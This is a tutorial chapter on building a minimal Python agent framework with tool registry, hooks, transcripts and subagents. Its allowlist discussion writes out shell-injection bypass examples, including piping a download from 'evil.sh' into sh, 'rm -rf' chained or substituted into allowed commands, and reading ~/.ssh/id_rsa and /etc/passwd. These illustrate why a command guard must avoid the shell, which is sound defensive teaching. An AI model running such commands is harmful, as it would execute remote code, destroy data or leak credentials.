# Chapter 07 - Build Your Own Framework

Knowledge in this chapter is current as of early 2026.
The code targets the Anthropic Messages API, whose request and response shapes shown here have been stable since 2024; the design is provider-neutral and the provider-specific surface is deliberately confined to one class so you can verify that claim by reading it.

## What you will master

- Which abstractions actually earned their keep across Volumes 03 through 07, and the test for deciding.
- A complete reference micro-framework of roughly three hundred lines: provider boundary, tool registry, agent loop, hooks, transcript persistence, and subagent spawning.
- The incremental build order, so each abstraction is introduced only when a concrete duplication forces it.
- The discipline of what to deliberately not abstract: prompts, orchestration, memory policy, and the provider surface beyond one seam.
- How to judge when your internal layer is done, and the failure modes of internal frameworks that did not stop.

## The extraction test

By now you have built agents across five volumes, and certain code appeared in every one of them: a loop that feeds tool results back to the model, a way to turn Python functions into tool schemas, logging of what happened, and a policy check before dangerous actions.
The rule for what belongs in your internal layer is extraction, not invention: an abstraction earns its place only when you have written the same code in at least two real agents and the variation between the copies is parameterizable.
Everything in this chapter passes that test; the final section lists the things that repeatedly fail it.
The target is deliberately modest: about three hundred lines that make the next agent a fifty-line file, while keeping every token that reaches the model visible in your own code.

## Step 1: the provider boundary

The first seam is a class that owns the only provider-specific code in the system.
Everything above it speaks in plain dictionaries shaped like the provider's message format, because inventing your own message format is the classic first mistake: it forces you to write translators both ways and loses provider features in the middle, which is the Chapter 06 lowest-common-denominator problem self-inflicted.
So the design rule is: adopt your primary provider's message dialect as your internal dialect, and confine the API call itself to one class.

```python
# micro_agent/provider.py
# Anthropic Messages API shapes, stable since 2024.
from dataclasses import dataclass, field
from typing import Any

import anthropic


@dataclass
class ModelTurn:
    """What the loop needs from one model call, and nothing else."""
    content: list[dict[str, Any]]      # raw content blocks, provider dialect
    stop_reason: str                   # "end_turn" | "tool_use" | "max_tokens" | ...
    usage: dict[str, int] = field(default_factory=dict)


class AnthropicProvider:
    def __init__(self, model: str, max_tokens: int = 4096):
        self.client = anthropic.Anthropic()
        self.model = model
        self.max_tokens = max_tokens

    def complete(self, system: str, messages: list[dict], tools: list[dict]) -> ModelTurn:
        response = self.client.messages.create(
            model=self.model,
            max_tokens=self.max_tokens,
            system=system,
            messages=messages,
            tools=tools,
        )
        return ModelTurn(
            content=[block.model_dump() for block in response.content],
            stop_reason=response.stop_reason,
            usage={
                "input_tokens": response.usage.input_tokens,
                "output_tokens": response.usage.output_tokens,
            },
        )
```

Design notes.
ModelTurn is the entire contract between the loop and the provider, so switching providers means writing one new class that translates its dialect into these three fields plus translating your stored messages, a contained rewrite rather than a project.
Retries for rate limits and transient errors belong here too (omitted for length; the provider SDK's built-in retry configuration covers the common cases).
What this seam does not attempt: normalizing multiple providers behind one interface simultaneously, because Chapter 06 showed what that costs; one primary dialect, one adapter per secondary provider, written only when actually needed.

## Step 2: the tool registry

The duplication that forces this abstraction: every agent hand-wrote JSON schemas that drifted from the Python signatures they described.
The fix is a decorator that derives the schema from the signature and docstring, so the function is the single source of truth, the same bet function_tool and Pydantic AI made in Chapters 03 and 05.

```python
# micro_agent/tools.py
import inspect
import json
from typing import Any, Callable, get_type_hints

_JSON_TYPES = {str: "string", int: "integer", float: "number", bool: "boolean"}


class ToolRegistry:
    def __init__(self):
        self._tools: dict[str, Callable] = {}
        self._schemas: dict[str, dict] = {}

    def tool(self, fn: Callable) -> Callable:
        """Register a function; schema is derived from signature and docstring."""
        hints = get_type_hints(fn)
        properties, required = {}, []
        for name, param in inspect.signature(fn).parameters.items():
            json_type = _JSON_TYPES.get(hints.get(name, str), "string")
            properties[name] = {"type": json_type}
            if param.default is inspect.Parameter.empty:
                required.append(name)
        self._tools[fn.__name__] = fn
        self._schemas[fn.__name__] = {
            "name": fn.__name__,
            "description": inspect.getdoc(fn) or fn.__name__,
            "input_schema": {
                "type": "object",
                "properties": properties,
                "required": required,
            },
        }
        return fn

    def share(self, other: "ToolRegistry", *names: str) -> "ToolRegistry":
        """Copy registered tools into another registry, function and schema together."""
        for name in names:
            other._tools[name] = self._tools[name]
            other._schemas[name] = self._schemas[name]
        return other

    def schemas(self) -> list[dict]:
        return list(self._schemas.values())

    def execute(self, name: str, args: dict[str, Any]) -> str:
        """Run a tool; errors become text the model can read and react to."""
        if name not in self._tools:
            return f"Error: unknown tool '{name}'."
        try:
            result = self._tools[name](**args)
            return result if isinstance(result, str) else json.dumps(result)
        except Exception as exc:
            return f"Error: {type(exc).__name__}: {exc}"
```

Design notes.
Errors are returned as strings, never raised into the loop, because Volume 03 established that a tool error is information for the model, not an exception for the process; the model reading "FileNotFoundError" and trying another path is the self-correction loop working.
The schema derivation handles flat primitive signatures only, which covers most tools; when a tool needs nested structure, write that one schema by hand rather than growing a type-mapping engine, because the registry's job is removing duplication, not replacing JSON Schema.
`share` exists because handing a read-only tool to a subagent is a recurring need (Step 6), and the callable and its schema must move together or the model sees a tool with nothing behind it; three lines here keep every caller out of `_tools` and `_schemas`.
The docstring is prompt engineering: it is what the model reads when deciding whether and how to call the tool, so it is subject to the same review discipline as any prompt.

## Step 3: hooks

Before writing the loop, define the interception points, because bolting them on later means threading callbacks through finished code.
Two lessons from Chapter 02 drive the design: policy must be code rather than prompt text, and observation must be possible at every step.

```python
# micro_agent/hooks.py
from dataclasses import dataclass, field
from typing import Any, Callable


@dataclass
class HookDecision:
    allow: bool = True
    reason: str = ""
    replacement_result: str | None = None   # deny-with-message goes to the model


@dataclass
class Hooks:
    pre_tool: list[Callable[[str, dict], HookDecision]] = field(default_factory=list)
    post_tool: list[Callable[[str, dict, str], None]] = field(default_factory=list)
    on_turn: list[Callable[[Any], None]] = field(default_factory=list)

    def check_tool(self, name: str, args: dict) -> HookDecision:
        for hook in self.pre_tool:
            decision = hook(name, args)
            if not decision.allow:
                return decision
        return HookDecision()
```

Design notes.
Pre-tool hooks are veto gates: the first denial wins, and the denial reason is sent to the model as the tool result, so the agent learns the boundary instead of silently stalling.
Post-tool and per-turn hooks are observation points for logging, metrics, and cost tracking, and they cannot veto, which keeps the security-relevant surface small enough to audit in one sitting.
This is the minimal shape that covers the real cases from earlier volumes: an allowlist on shell commands, a spend cap, a redaction pass on tool output, and structured logging.

## Step 4: transcript persistence

The duplication that forces this: every debugging session in Volumes 03 through 07 began with "what exactly happened", and every agent answered it with ad hoc prints.
The fix is an append-only JSONL transcript, one event per line, written as events occur so a crash loses nothing.

```python
# micro_agent/transcript.py
import json
import time
import uuid
from pathlib import Path


class Transcript:
    def __init__(self, directory: str, run_id: str | None = None,
                 parent_run_id: str | None = None):
        self.run_id = run_id or uuid.uuid4().hex[:12]
        self.parent_run_id = parent_run_id
        self.path = Path(directory) / f"{self.run_id}.jsonl"
        self.path.parent.mkdir(parents=True, exist_ok=True)

    def log(self, kind: str, payload: dict):
        record = {"ts": time.time(), "run_id": self.run_id, "kind": kind, **payload}
        if self.parent_run_id:
            record["parent_run_id"] = self.parent_run_id
        with self.path.open("a") as f:
            f.write(json.dumps(record, default=str) + "\n")
```

Design notes.
JSONL over a database is deliberate: it needs no infrastructure, greps cleanly, survives crashes line-by-line, and imports into any analysis tool later; when you outgrow it, the event vocabulary transfers to a real trace backend unchanged, and Volume 10 does exactly that.
`parent_run_id` is the one field that is not about a single run: a subagent writes its own file, and without a stamped parent that file is an orphan you cannot tie back to the delegation that caused it.
Log the payloads you actually sent, not summaries of them, because the entire value is answering "what did the model see" without reconstruction; this is Chapter 01's transparency criterion applied to your own code, and it is embarrassing how many internal frameworks fail their own test.

## Step 5: the loop

Now the centerpiece, which is the Volume 03 loop with the seams above plugged in.

```python
# micro_agent/agent.py
import json

from .hooks import Hooks
from .provider import AnthropicProvider, ModelTurn
from .tools import ToolRegistry
from .transcript import Transcript


class Agent:
    def __init__(self, provider: AnthropicProvider, tools: ToolRegistry,
                 system: str, hooks: Hooks | None = None,
                 transcript_dir: str = "runs", max_turns: int = 20,
                 parent_run_id: str | None = None):
        self.provider = provider
        self.tools = tools
        self.system = system
        self.hooks = hooks or Hooks()
        self.transcript_dir = transcript_dir
        self.max_turns = max_turns
        self.parent_run_id = parent_run_id
        self.run_id: str | None = None      # set per run; subagents link to it

    def run(self, user_input: str, messages: list[dict] | None = None) -> str:
        transcript = Transcript(self.transcript_dir, parent_run_id=self.parent_run_id)
        self.run_id = transcript.run_id
        messages = list(messages or [])
        messages.append({"role": "user", "content": user_input})
        transcript.log("user", {"content": user_input})

        for _ in range(self.max_turns):
            turn = self.provider.complete(self.system, messages, self.tools.schemas())
            transcript.log("model_turn", {"content": turn.content,
                                          "stop_reason": turn.stop_reason,
                                          "usage": turn.usage})
            for hook in self.hooks.on_turn:
                hook(turn)
            messages.append({"role": "assistant", "content": turn.content})

            if turn.stop_reason != "tool_use":
                return self._final_text(turn)

            results = []
            for block in turn.content:
                if block["type"] != "tool_use":
                    continue
                name, args = block["name"], block["input"]
                decision = self.hooks.check_tool(name, args)
                if decision.allow:
                    output = self.tools.execute(name, args)
                else:
                    output = decision.replacement_result or f"Denied: {decision.reason}"
                transcript.log("tool", {"name": name, "args": args,
                                        "output": output[:2000],
                                        "allowed": decision.allow})
                for hook in self.hooks.post_tool:
                    hook(name, args, output)
                results.append({"type": "tool_result",
                                "tool_use_id": block["id"],
                                "content": output})
            messages.append({"role": "user", "content": results})

        return "Stopped: max_turns reached."

    @staticmethod
    def _final_text(turn: ModelTurn) -> str:
        return "".join(b["text"] for b in turn.content if b["type"] == "text")
```

Design notes.
The loop is under sixty lines and contains every decision that matters: it handles parallel tool calls in one turn (the inner for over blocks), it caps runaway agents with max_turns, and it routes every side effect through the hook gate.
The messages list is caller-visible state: run accepts prior messages and the caller owns persistence between runs, which keeps conversation memory policy (Volume 06's whole subject) out of the framework on purpose.
What is deliberately absent: streaming (add it when a UI needs it, as a callback in on_turn), context compaction (a policy decision, not plumbing), and async (worth adding when you first need parallel subagents, not before).

## Step 6: subagent spawn

The last abstraction, forced by Volume 07: delegating a subtask to a fresh context.
The insight that keeps it small is that a subagent is just a tool whose implementation runs another Agent.

```python
# micro_agent/subagent.py
from .agent import Agent
from .tools import ToolRegistry


def make_subagent_tool(parent: Agent, name: str, system: str,
                       sub_tools: ToolRegistry, description: str,
                       max_turns: int = 10):
    """Register a subagent as a callable tool on the parent's registry."""
    def _spawn(task: str) -> str:
        agent = Agent(parent.provider, sub_tools, system=system,
                      hooks=parent.hooks,                     # policy is inherited
                      transcript_dir=parent.transcript_dir,
                      max_turns=max_turns,
                      parent_run_id=parent.run_id)
        return agent.run(task)
    _spawn.__name__ = name
    _spawn.__doc__ = description
    parent.tools.tool(_spawn)
```

Design notes.
The subagent gets a fresh messages list (context isolation), its own registry (least privilege), and returns one string to the parent (the quarantine pattern from Chapter 02), and all three properties fall out of composition rather than new machinery.
What does not fall out for free is policy, which is why the spawn takes the parent `Agent` rather than a bare registry and a provider.
Taking the parent means there is one source of truth for everything the subagent inherits, and a second `provider` argument alongside it would be a way to spell "run this delegated work on a different model while claiming to inherit the parent's configuration", which is a bug in every case a caller would actually hit.
Constructing the subagent without `hooks` gives it an empty `Hooks()`, and delegation then becomes the way around every gate you wrote: put a shell tool in `sub_tools` and the parent's allowlist never runs.
Least privilege is about which tools the subagent holds, not about which rules apply to them, so the tool set narrows while the policy is inherited whole.
Passing `parent_run_id` closes the matching gap in observability, because a delegated run that writes an unlinked JSONL file cannot answer "what did the model see" for the part of the work you most want to inspect.
The description docstring is the delegation contract: Volume 07 showed that underspecified task handoffs are the dominant subagent failure, and here that lesson becomes "the parent model only knows what this docstring says".
Recursion depth is implicitly bounded by which registries you wire together; wiring a subagent tool into its own registry is how you build an infinite spawn bomb, so do not.

## Assembling an agent

The payoff: a complete agent with path confinement, command policy, logging, and a subagent in about sixty lines of application code.

```python
# review_agent.py
import glob
import os
import shlex
import subprocess
from pathlib import Path

from micro_agent.agent import Agent
from micro_agent.hooks import HookDecision, Hooks
from micro_agent.provider import AnthropicProvider
from micro_agent.subagent import make_subagent_tool
from micro_agent.tools import ToolRegistry

ROOT = Path.cwd().resolve()

provider = AnthropicProvider(model="claude-sonnet-4-5")
tools = ToolRegistry()

def confined(path: str) -> Path:
    """Resolve a model-supplied path and confine it to ROOT."""
    p = (ROOT / os.path.expanduser(path)).resolve()
    if p != ROOT and ROOT not in p.parents:
        raise ValueError(f"path {path!r} escapes the project root")
    return p

@tools.tool
def read_file(path: str) -> str:
    """Read a text file inside the project and return its contents."""
    return confined(path).read_text(encoding="utf-8")

# Each entry is matched as a whole token sequence against the parsed argument
# vector, never as a string prefix, so "ls" admits `ls -la` and not `lsof`.
# The entry authorizes a program; the argument rules below decide what it may
# be told to do.
ALLOWED_COMMANDS = ("git status", "git diff", "git log", "git show",
                    "ls", "cat", "rg", "python -m pytest")
GLOB_CHARS = set("*?[")

def allowed_argv(command: str) -> list[str] | None:
    """Parse command into an argv that needs no shell, or None if not allowed."""
    try:
        argv = shlex.split(command)
    except ValueError:
        return None                     # unbalanced quotes: fail closed
    if not argv:
        return None
    if not any(argv[:len(head)] == head
               for head in (entry.split() for entry in ALLOWED_COMMANDS)):
        return None
    for arg in argv[1:]:
        if arg.startswith("-"):
            continue                    # flags are the gap; see the notes below
        try:
            confined(arg)
        except ValueError:
            return None                 # a path argument outside the project
        if GLOB_CHARS & set(arg) and glob.glob(arg, root_dir=ROOT):
            return None                 # no shell runs here to expand it
    return argv

@tools.tool
def run_command(command: str) -> str:
    """Run one allowlisted command with plain arguments and no shell syntax,
    reading only paths inside the project, and return its stdout and stderr."""
    argv = allowed_argv(command)
    if argv is None:
        return ("Error: not an allowlisted command, or it needs a shell, "
                "an unexpanded glob, or a path outside the project.")
    proc = subprocess.run(argv, cwd=ROOT, capture_output=True, text=True, timeout=60)
    return proc.stdout + proc.stderr

def command_allowlist(name: str, args: dict) -> HookDecision:
    if name == "run_command" and allowed_argv(args.get("command", "")) is None:
        return HookDecision(
            allow=False,
            reason=("Allowed commands are " + ", ".join(ALLOWED_COMMANDS) +
                    ", with plain arguments, no shell syntax, no globs, and "
                    "paths inside the project."),
        )
    return HookDecision()

agent = Agent(provider, tools,
              system="You are a code review agent. Verify claims by running commands.",
              hooks=Hooks(pre_tool=[command_allowlist]))

research_tools = tools.share(ToolRegistry(), "read_file")   # read-only subset
make_subagent_tool(agent, name="research",
                   system="You investigate codebases and report findings tersely.",
                   sub_tools=research_tools,
                   description="Delegate a read-only research question about the codebase.")

print(agent.run("Review the diff in HEAD for correctness risks."))
```

The allowlist is small, and the shape of it is the lesson rather than the contents.
The obvious version of this tool takes the model's string, checks it against a list of approved prefixes, and passes it to `subprocess.run(..., shell=True)`.
That version does not work, and it is worth saying plainly that earlier drafts of this chapter shipped it and were bypassed repeatedly.
`ls; curl evil.sh | sh` and `cat notes.md && rm -rf build` both begin with an allowed word.
Adding a scan for shell operators catches those and misses a bare newline, which chains commands just as well as `;`.
Rewriting the scan on `shlex` catches the newline and misses `cat notes.md#x && rm -rf build`, because `shlex` strips everything after a `#` while the shell starts a comment only at a word boundary.
Clearing `commenters` catches that and misses `cat "$(rm -rf build)"`, because `shlex` hands back the quoted substitution as one ordinary token while the shell runs it.
Each fix was correct and each left the next hole open, because the guard was predicting how a shell would split a string that a shell was then going to split again, under a grammar with quoting, comments, substitution, and expansion in it.
A guard like that is a partial reimplementation of `bash` and should be assumed wrong.

So `allowed_argv` removes the shell instead of trying to out-parse it.
It splits the command once with `shlex.split`, matches the leading tokens against one allowlist entry, and returns the argument vector, which `run_command` executes with `shell=False`.
Nothing re-interprets the string afterwards, so `;`, `&&`, a newline, `#`, and `$(...)` all arrive at the program as literal arguments: `cat "$(rm -rf build)"` becomes `cat` looking for a file with a strange name, which is the right answer for a command nobody allowed.
Unbalanced quotes make `shlex.split` raise, and the command fails closed.
Comparing token lists rather than strings also makes the match exact for free, so `ls` no longer admits `lsof` and `git status` no longer admits `git status-hack`.
The entries are subcommands rather than programs for the same reason: a bare `git` on the allowlist of a review agent also authorizes `git push`, `git reset --hard`, and `git clean -fdx`, which is why Volume 13 Chapter 07 names `git push` on its deny list, and naming the four read-only subcommands here settles the question in one place instead of two.

Naming the right program is still not the whole policy, which is why the loop over `argv[1:]` is there.
`cat` is as read-only as a program gets, and `cat ~/.ssh/id_rsa` is an exfiltration tool built out of it, because `cwd=ROOT` constrains where relative paths start and says nothing about where an absolute one ends.
So every plain argument goes through `confined`, the same function `read_file` uses, and an argument that resolves outside the project takes the command off the allowlist.
Globs are refused rather than expanded for a different reason: with no shell there is nothing to expand `*.py`, so `ls *.py` would otherwise run and report a missing file, which reads as an empty directory rather than as the policy effect it is, and expanding it here would be worse because `shlex.split` has already discarded the quoting that says whether the model meant a pattern or a filename.
The check probes the filesystem first, so only a pattern that would really have expanded is refused and `rg 'foo.*bar'` still works as a regex.

The check appears twice on purpose, and the duplication is the point rather than an oversight.
The hook is the policy layer: it produces the denial the model reads and the `allowed: False` line in the transcript, which is what makes the decision reviewable.
The tool's own call is capability confinement: `run_command` is incapable of constructing a shell no matter which registry it is wired into or whose hooks are attached, so a future caller who forgets the gate loses the audit trail rather than the sandbox.
Policy you can read and a capability you cannot exceed are different guarantees, and a framework that offers only the first has talked itself into trusting every future wiring decision.
`read_file` and `run_command` both route their paths through `confined` for the same reason, so the confinement is a property of the agent rather than of whichever tool the model happens to reach for, and the research subagent inherits it twice over because its registry holds only the read tool.
Be exact about how far that goes, because a guarantee stated wider than the code is worse than no guarantee at all: the rule covers plain path arguments, and it does not look behind a `-`, so `rg --file=/etc/passwd` is a hole that stays open until each allowed program has a schema saying which of its flags take paths.
Write it this way and the hook is policy as code; write it as a `startswith` over a tuple of program names with a shell behind it and it is a suggestion.

The ordering in the last three statements is load-bearing.
The parent agent is constructed first so the subagent tool can be registered against it, which is how the subagent inherits the parent's hooks instead of silently running with none.
Registering after construction still works because the loop asks the registry for schemas on every turn, and `share` moves the callable and its schema together so the subagent's registry can never advertise a tool it cannot call.

Total framework size across the five modules: roughly three hundred lines, every one of which you can read, and a transcript on disk for every run.
That is the entire point.

## What to deliberately not abstract

The restraint list matters more than the code, because internal frameworks die of scope, not of bugs.

- Prompts: keep system prompts as literal strings in application code, not in a template engine, a prompt class hierarchy, or a YAML store; prompts are the part you edit most and review hardest, and every layer between the author and the literal text reintroduces the opacity this whole volume warned about.
- The provider surface beyond one seam: no universal multi-provider interface; Chapter 06 showed the price, and your seam makes a future migration a contained rewrite, which is cheap enough.
- Orchestration DSLs: no graph builders, no crew classes, no workflow YAML; Python's if, for, and function calls express supervisor patterns, pipelines, and fan-out already, and the moment control flow is data you have started rebuilding LangGraph without its ten thousand hours of hardening; if you truly need durable checkpointed execution, buy it (Chapter 04) rather than growing it here.
- Memory policy: compaction thresholds, summarization strategy, and long-term stores are product decisions that vary per agent (Volume 06); the framework hands the caller the messages list and stays out of the way.
- Evals and tracing backends: emit JSONL events and let Volume 10 tooling consume them; the framework should produce evidence, not judge it.
- Configuration systems: constructor arguments are the configuration; the day this framework has a config file format, it has become the thing it was built to escape.

The test for any proposed addition is the extraction rule from the top of the chapter, applied without sentiment: two real duplications, parameterizable variation, or it stays application code.
And the exit criterion is worth writing down for your team: this layer is finished when new agents stop requiring changes to it, and a finished internal framework is a success, not a stalled project.

## Exercises

1. Type the framework in yourself (do not paste it), then build one real agent on it end to end; typing it is the point, because the goal of this chapter is that you own every line.
2. Write a second provider class for a different vendor's dialect, translating to and from ModelTurn and the stored message format; document every place the translation loses information, connecting each loss to Chapter 06.
3. Add a spend-cap hook that reads usage from on_turn events and denies all further tool calls past a dollar budget; verify from the transcript that the denial reason reached the model.
4. Build a transcript viewer: a fifty-line script that renders a run's JSONL as a readable trace with per-turn token costs; then use it, not print statements, to debug your next agent bug.
5. Add streaming as an on_turn-adjacent callback without changing the loop's control flow; write down what the exercise taught you about why the seams were placed where they were.
6. Violate the restraint list on purpose: spend one hour starting a YAML workflow layer on top of the framework, then stop and write a one-page post-mortem on what it was starting to cost and what LangGraph feature you were re-deriving.
7. Run the same task through this framework and through the Claude Agent SDK; compare transcripts, token spend, and the time it takes you to answer "why did it do that" in each.

## Godhood check

Answer these cold before moving on.

- State the extraction test and apply it to two abstractions this chapter includes and two it refuses.
- Why does the framework adopt the provider's message dialect internally instead of inventing its own, and which chapter's failure mode does that avoid?
- Why do tool errors return strings instead of raising, and which volume's principle is that?
- Trace a denied tool call through the system: which component decides, what does the model see, and where is it logged?
- Why is the subagent a tool rather than a new concept, which three Volume 07 properties fall out of that composition for free, and which two must be passed in explicitly or delegation becomes a way around your own policy?
- Name the six things on the do-not-abstract list and the strongest reason for any two of them.
- What is the exit criterion for an internal framework, and why is reaching it a success?
